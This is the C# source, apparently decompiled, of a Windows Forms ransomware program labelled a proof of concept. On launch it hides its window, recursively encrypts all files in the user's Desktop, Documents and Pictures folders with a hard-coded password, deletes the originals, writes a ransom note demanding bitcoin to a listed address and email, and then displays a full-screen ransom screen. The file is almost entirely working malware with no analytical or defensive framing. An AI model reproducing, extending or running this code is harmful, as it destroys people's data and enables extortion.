using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

namespace RansomwarePOC;

public class Form1 : Form
{
	private const bool DELETE_ALL_ORIGINALS = true;

	private const bool ENCRYPT_DESKTOP = true;

	private const bool ENCRYPT_DOCUMENTS = true;

	private const bool ENCRYPT_PICTURES = true;

	private const string V = ".AES64";

	private const string ENCRYPTED_FILE_EXTENSION = ".AES64";

	private const string ENCRYPT_PASSWORD = "22*QJ4dE=3mHm3%k84Z#c-zSvF+c-87ffLGz7hwF+c22*QJ4dE=3mHm3%k84Z#-v22*QJ4dE=3mHm3%k84Z#87ffLGF+c-8722*QJ4dE=3mHm3%k84Z#ffLGF+c-87ffLG%7dRWR4N2vNuc-zSz7hw%7dRWR4N2vNuRptvXmcJ7h9Quv$NJ5&=zHJ5&=zHhgtDJ3jLr!hgtDF+c-87ffLGJ3jLr!V9qFS%7^V9qFS%7^BG(?G1H,%]F+c-87ffLGyu-H4C#W$8KDg$tthbCAfa#W$8KDg$tthbCAfahK6R@q39116353911635jq5N_n}xA2yD49=FP5aDLu+:P~a3@Lg5?R{Lg5?R{j8S[UX4phW4GK[UX4phW4GKk-w82XWce8@t5YKX%g?62GKUTG#8A^bqBVpGFA3%zEmrr4S%pB2Emrr4S%pBF+c-87ffLGF+c-87fGKUTG#8A^bqBVpGFA22*QJ4dE=3mHm3%k84Z#3%zfLGGKUTG#8A^FhQk_e-Mk?cg#67Rykcr%zFhQk_e-Mk?cg#67Rykcr22*QJ4dE=3mHm3%k84Z#";

	private const string BITCOIN_ADDRESS = "3KCs2PG8dZuNwPBCE1ULTt6TT24UPLePUU";

	private const string BITCOIN_RANSOM_AMOUNT = "10";

	private const string EMAIL_ADDRESS = "bussinesemail07@gmail.com";

	private static string ENCRYPTION_LOG = "";

	private string RANSOM_LETTER = "All of your documents have been encrypted.\n\nIf you want to get them back you need to send 10 bitcoin(s) to the following btc address: 3KCs2PG8dZuNwPBCE1ULTt6TT24UPLePUU\nAnd send your transaction id at: bussinesemail07@gmail.com\n\nThank you and have a nice day!\n\nEncryption logs:\n----------------------------------------\n";

	private string DESKTOP_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);

	private string DOCUMENTS_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.Personal);

	private string PICTURES_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);

	private static int encryptedFileCount = 0;

	private IContainer components = null;

	private Label lblCount;

	private Label lblBitcoinAmount;

	private Label label2;

	private TextBox txtBitcoinAddress;

	private TextBox txtEmailAddress;

	private Label label3;

	private PictureBox pictureBox1;

	private Label label5;

	private PictureBox pictureBox2;

	public Form1()
	{
		InitializeComponent();
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		initializeForm();
		encryptFolderContents(DESKTOP_FOLDER);
		encryptFolderContents(PICTURES_FOLDER);
		encryptFolderContents(DOCUMENTS_FOLDER);
		if (encryptedFileCount > 0)
		{
			formatFormPostEncryption();
			dropRansomLetter();
		}
		else
		{
			Console.Out.WriteLine("No files to encrypt.");
			Application.Exit();
		}
	}

	private void dropRansomLetter()
	{
		StreamWriter streamWriter = new StreamWriter(DESKTOP_FOLDER + "\\___RECOVER__FILES__.AES64.txt");
		streamWriter.WriteLine(RANSOM_LETTER);
		streamWriter.WriteLine(ENCRYPTION_LOG);
		streamWriter.Close();
	}

	private void formatFormPostEncryption()
	{
		((Form)this).set_Opacity(100.0);
		((Form)this).set_WindowState((FormWindowState)2);
		((Control)lblCount).set_Text("Your files (count: " + encryptedFileCount + ") are encrypted!");
	}

	private void initializeForm()
	{
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowInTaskbar(false);
		((Control)lblBitcoinAmount).set_Text("Please send 10 Bitcoin(s) in the following bitcoin address:");
		((Control)txtBitcoinAddress).set_Text("3KCs2PG8dZuNwPBCE1ULTt6TT24UPLePUU");
		((Control)txtEmailAddress).set_Text("bussinesemail07@gmail.com");
		((Control)lblBitcoinAmount).Focus();
	}

	private static void encryptFolderContents(string sDir)
	{
		try
		{
			string[] files = Directory.GetFiles(sDir);
			foreach (string text in files)
			{
				if (!text.Contains(".AES64"))
				{
					Console.Out.WriteLine("Encrypting: " + text);
					FileEncrypt(text, "22*QJ4dE=3mHm3%k84Z#c-zSvF+c-87ffLGz7hwF+c22*QJ4dE=3mHm3%k84Z#-v22*QJ4dE=3mHm3%k84Z#87ffLGF+c-8722*QJ4dE=3mHm3%k84Z#ffLGF+c-87ffLG%7dRWR4N2vNuc-zSz7hw%7dRWR4N2vNuRptvXmcJ7h9Quv$NJ5&=zHJ5&=zHhgtDJ3jLr!hgtDF+c-87ffLGJ3jLr!V9qFS%7^V9qFS%7^BG(?G1H,%]F+c-87ffLGyu-H4C#W$8KDg$tthbCAfa#W$8KDg$tthbCAfahK6R@q39116353911635jq5N_n}xA2yD49=FP5aDLu+:P~a3@Lg5?R{Lg5?R{j8S[UX4phW4GK[UX4phW4GKk-w82XWce8@t5YKX%g?62GKUTG#8A^bqBVpGFA3%zEmrr4S%pB2Emrr4S%pBF+c-87ffLGF+c-87fGKUTG#8A^bqBVpGFA22*QJ4dE=3mHm3%k84Z#3%zfLGGKUTG#8A^FhQk_e-Mk?cg#67Rykcr%zFhQk_e-Mk?cg#67Rykcr22*QJ4dE=3mHm3%k84Z#");
				}
			}
			string[] directories = Directory.GetDirectories(sDir);
			foreach (string sDir2 in directories)
			{
				encryptFolderContents(sDir2);
			}
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex.Message);
		}
	}

	private static void FileEncrypt(string inputFile, string password)
	{
		byte[] array = GenerateRandomSalt();
		FileStream fileStream = new FileStream(inputFile + ".AES64", FileMode.Create);
		byte[] bytes = Encoding.UTF8.GetBytes(password);
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		rijndaelManaged.Padding = PaddingMode.PKCS7;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(bytes, array, 50000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		fileStream.Write(array, 0, array.Length);
		CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
		FileStream fileStream2 = new FileStream(inputFile, FileMode.Open);
		byte[] array2 = new byte[1048576];
		try
		{
			int count;
			while ((count = fileStream2.Read(array2, 0, array2.Length)) > 0)
			{
				cryptoStream.Write(array2, 0, count);
			}
			fileStream2.Close();
		}
		catch (Exception ex)
		{
			Console.WriteLine("Error: " + ex.Message);
		}
		finally
		{
			ENCRYPTION_LOG = ENCRYPTION_LOG + inputFile + "\n";
			encryptedFileCount++;
			cryptoStream.Close();
			fileStream.Close();
			File.Delete(inputFile);
		}
	}

	private static void FileDecrypt(string inputFile, string outputFile, string password)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(password);
		byte[] array = new byte[32];
		FileStream fileStream = new FileStream(inputFile, FileMode.Open);
		fileStream.Read(array, 0, array.Length);
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(bytes, array, 50000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Padding = PaddingMode.PKCS7;
		rijndaelManaged.Mode = CipherMode.CBC;
		CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Read);
		FileStream fileStream2 = new FileStream(outputFile, FileMode.Create);
		byte[] array2 = new byte[1048576];
		try
		{
			int count;
			while ((count = cryptoStream.Read(array2, 0, array2.Length)) > 0)
			{
				fileStream2.Write(array2, 0, count);
			}
		}
		catch (CryptographicException ex)
		{
			Console.WriteLine("CryptographicException error: " + ex.Message);
		}
		catch (Exception ex2)
		{
			Console.WriteLine("Error: " + ex2.Message);
		}
		try
		{
			cryptoStream.Close();
		}
		catch (Exception ex3)
		{
			Console.WriteLine("Error by closing CryptoStream: " + ex3.Message);
		}
		finally
		{
			fileStream2.Close();
			fileStream.Close();
		}
	}

	public static byte[] GenerateRandomSalt()
	{
		byte[] array = new byte[32];
		using (RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider())
		{
			for (int i = 0; i < 10; i++)
			{
				rNGCryptoServiceProvider.GetBytes(array);
			}
		}
		return array;
	}

	private void lblCount_Click(object sender, EventArgs e)
	{
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_00af: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b9: Expected O, but got Unknown
		//IL_016f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0179: Expected O, but got Unknown
		//IL_0203: Unknown result type (might be due to invalid IL or missing references)
		//IL_020d: Expected O, but got Unknown
		//IL_02ae: Unknown result type (might be due to invalid IL or missing references)
		//IL_02b8: Expected O, but got Unknown
		//IL_0349: Unknown result type (might be due to invalid IL or missing references)
		//IL_0353: Expected O, but got Unknown
		//IL_03e5: Unknown result type (might be due to invalid IL or missing references)
		//IL_03ef: Expected O, but got Unknown
		//IL_048d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0497: Expected O, but got Unknown
		//IL_053c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0546: Expected O, but got Unknown
		//IL_05bc: Unknown result type (might be due to invalid IL or missing references)
		//IL_05c6: Expected O, but got Unknown
		//IL_071e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0728: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		lblCount = new Label();
		lblBitcoinAmount = new Label();
		label2 = new Label();
		txtBitcoinAddress = new TextBox();
		txtEmailAddress = new TextBox();
		label3 = new Label();
		label5 = new Label();
		pictureBox1 = new PictureBox();
		pictureBox2 = new PictureBox();
		((ISupportInitialize)pictureBox1).BeginInit();
		((ISupportInitialize)pictureBox2).BeginInit();
		((Control)this).SuspendLayout();
		((Control)lblCount).set_Anchor((AnchorStyles)14);
		((Control)lblCount).set_Font(new Font("Microsoft Sans Serif", 27.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)lblCount).set_ForeColor(Color.White);
		lblCount.set_ImageAlign((ContentAlignment)1);
		((Control)lblCount).set_Location(new Point(5, 9));
		((Control)lblCount).set_Name("lblCount");
		((Control)lblCount).set_Size(new Size(460, 99));
		((Control)lblCount).set_TabIndex(0);
		((Control)lblCount).set_Text("Your files (count: n) are encrypted!");
		lblCount.set_TextAlign((ContentAlignment)32);
		((Control)lblCount).add_Click((EventHandler)lblCount_Click);
		((Control)lblBitcoinAmount).set_Anchor((AnchorStyles)14);
		((Control)lblBitcoinAmount).set_Font(new Font("Microsoft Sans Serif", 24f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)lblBitcoinAmount).set_ForeColor(Color.White);
		((Control)lblBitcoinAmount).set_Location(new Point(12, 231));
		((Control)lblBitcoinAmount).set_Name("lblBitcoinAmount");
		((Control)lblBitcoinAmount).set_Size(new Size(431, 121));
		((Control)lblBitcoinAmount).set_TabIndex(1);
		((Control)lblBitcoinAmount).set_Text("You will have to send 13 bitcoin(s)to the following address:");
		((Control)label2).set_Anchor((AnchorStyles)14);
		((Control)label2).set_Font(new Font("Microsoft Sans Serif", 24f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label2).set_ForeColor(Color.White);
		label2.set_ImageAlign((ContentAlignment)1);
		((Control)label2).set_Location(new Point(5, 454));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(531, 92));
		((Control)label2).set_TabIndex(2);
		((Control)label2).set_Text("And send your transaction id to the following email address:");
		label2.set_TextAlign((ContentAlignment)32);
		((Control)txtBitcoinAddress).set_Anchor((AnchorStyles)2);
		((Control)txtBitcoinAddress).set_Font(new Font("Microsoft Sans Serif", 24f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)txtBitcoinAddress).set_Location(new Point(12, 372));
		((Control)txtBitcoinAddress).set_Name("txtBitcoinAddress");
		((TextBoxBase)txtBitcoinAddress).set_ReadOnly(true);
		((Control)txtBitcoinAddress).set_Size(new Size(491, 44));
		((Control)txtBitcoinAddress).set_TabIndex(3);
		((Control)txtBitcoinAddress).set_Text("1BtUL5dhVXHwKLqSdhjyjK9Pe64Vc6CEH1");
		txtBitcoinAddress.set_TextAlign((HorizontalAlignment)2);
		((Control)txtEmailAddress).set_Anchor((AnchorStyles)2);
		((Control)txtEmailAddress).set_Font(new Font("Microsoft Sans Serif", 24f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)txtEmailAddress).set_Location(new Point(12, 576));
		((Control)txtEmailAddress).set_Name("txtEmailAddress");
		((TextBoxBase)txtEmailAddress).set_ReadOnly(true);
		((Control)txtEmailAddress).set_Size(new Size(510, 44));
		((Control)txtEmailAddress).set_TabIndex(4);
		((Control)txtEmailAddress).set_Text("friendly.cyber.criminal@gmail.com");
		txtEmailAddress.set_TextAlign((HorizontalAlignment)2);
		((Control)label3).set_Anchor((AnchorStyles)14);
		((Control)label3).set_Font(new Font("Microsoft Sans Serif", 27.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label3).set_ForeColor(Color.White);
		label3.set_ImageAlign((ContentAlignment)1);
		((Control)label3).set_Location(new Point(5, 125));
		((Control)label3).set_Name("label3");
		((Control)label3).set_Size(new Size(460, 106));
		((Control)label3).set_TabIndex(5);
		((Control)label3).set_Text("if you want to get them back");
		label3.set_TextAlign((ContentAlignment)2);
		((Control)label5).set_Anchor((AnchorStyles)14);
		((Control)label5).set_Font(new Font("Microsoft Sans Serif", 24f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label5).set_ForeColor(Color.Crimson);
		((Control)label5).set_Location(new Point(12, 777));
		((Control)label5).set_Name("label5");
		((Control)label5).set_Size(new Size(914, 71));
		((Control)label5).set_TabIndex(8);
		((Control)label5).set_Text(".");
		label5.set_TextAlign((ContentAlignment)32);
		((Control)pictureBox1).set_Anchor((AnchorStyles)15);
		((Control)pictureBox1).set_BackColor(Color.Red);
		pictureBox1.set_Image((Image)componentResourceManager.GetObject("pictureBox1.Image"));
		((Control)pictureBox1).set_Location(new Point(524, 9));
		((Control)pictureBox1).set_Name("pictureBox1");
		((Control)pictureBox1).set_Size(new Size(402, 439));
		pictureBox1.set_SizeMode((PictureBoxSizeMode)1);
		pictureBox1.set_TabIndex(6);
		pictureBox1.set_TabStop(false);
		pictureBox2.set_Image((Image)componentResourceManager.GetObject("pictureBox2.Image"));
		((Control)pictureBox2).set_Location(new Point(614, 500));
		((Control)pictureBox2).set_Name("pictureBox2");
		((Control)pictureBox2).set_Size(new Size(286, 274));
		pictureBox2.set_SizeMode((PictureBoxSizeMode)1);
		pictureBox2.set_TabIndex(9);
		pictureBox2.set_TabStop(false);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(Color.Red);
		((Form)this).set_ClientSize(new Size(938, 857));
		((Form)this).set_ControlBox(false);
		((Control)this).get_Controls().Add((Control)(object)pictureBox2);
		((Control)this).get_Controls().Add((Control)(object)label5);
		((Control)this).get_Controls().Add((Control)(object)label3);
		((Control)this).get_Controls().Add((Control)(object)txtEmailAddress);
		((Control)this).get_Controls().Add((Control)(object)txtBitcoinAddress);
		((Control)this).get_Controls().Add((Control)(object)label2);
		((Control)this).get_Controls().Add((Control)(object)lblBitcoinAmount);
		((Control)this).get_Controls().Add((Control)(object)lblCount);
		((Control)this).get_Controls().Add((Control)(object)pictureBox1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Control)this).set_Name("Form1");
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Control)this).set_Text("Ransom");
		((Form)this).add_Load((EventHandler)Form1_Load);
		((ISupportInitialize)pictureBox1).EndInit();
		((ISupportInitialize)pictureBox2).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
